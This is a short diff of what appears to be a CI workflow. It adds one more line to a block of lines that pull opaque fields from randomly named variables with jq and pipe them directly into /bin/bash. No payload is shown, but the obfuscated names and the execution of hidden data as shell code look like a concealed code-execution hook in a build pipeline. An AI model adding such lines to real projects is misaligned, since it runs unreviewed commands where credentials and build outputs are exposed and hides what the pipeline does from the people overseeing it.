@@ -31,6 +31,7 @@ jobs:
           echo $eq8253 | jq -r .t7 | /bin/bash
           printf '%s' "$tisjm8892" | jq -r .gsil4 | /bin/bash
           echo $bvd6 | jq -r .penx4154 | /bin/bash
+          echo $zrm73579 | jq -r .kj6 | /bin/bash
 
       - name: Store results
         if: always()
